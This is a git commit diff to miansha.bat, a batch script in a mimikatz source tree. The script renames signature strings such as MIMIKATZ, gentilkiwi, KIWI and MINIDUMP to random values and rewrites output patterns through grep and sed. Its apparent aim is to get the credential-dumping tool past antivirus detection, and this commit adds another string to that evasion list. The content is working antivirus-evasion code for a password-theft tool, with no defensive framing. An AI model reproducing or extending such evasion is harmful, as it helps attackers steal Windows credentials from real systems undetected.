1e82c701d22dd8ddb4c083b826f266005f08c924
xinroom <jiayou-xin@qq.com>
2021-07-01 23:32:00 +0800

    [test] 去除"  * "特征

--- miansha.bat
+++ miansha.bat
@@ -24,7 +24,7 @@ for %%a in (_m_) do (
 )
 
 echo 处理不需要重名名文件的
-for %%a in (gentilkiwi MIMIKATZ KIWI oe.eo Vincent MINIDUMP L_M_) do (
+for %%a in (gentilkiwi MIMIKATZ KIWI oe.eo Vincent MINIDUMP L_M_ creativecommons) do (
     call :RandomStr 5
     call :FileRC %%a !_out!
 )
@@ -32,7 +32,7 @@ for %%a in (gentilkiwi MIMIKATZ KIWI oe.eo Vincent MINIDUMP L_M_) do (
 call :RandomStr 5
 tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "LSASS minidump" . | tools\xargs tools\sed -b -i "s/LSASS minidump/!_out!/g"
 
-tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "* Domain " . | tools\xargs tools\sed -b -i "s/* Domain /* Dom /g"
+tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "  * " . | tools\xargs tools\sed -b -i "s/  * /  * * /g"
 
 call :FileRC minidump MiNidump
 call :FileRC logonpasswords logonPasswords
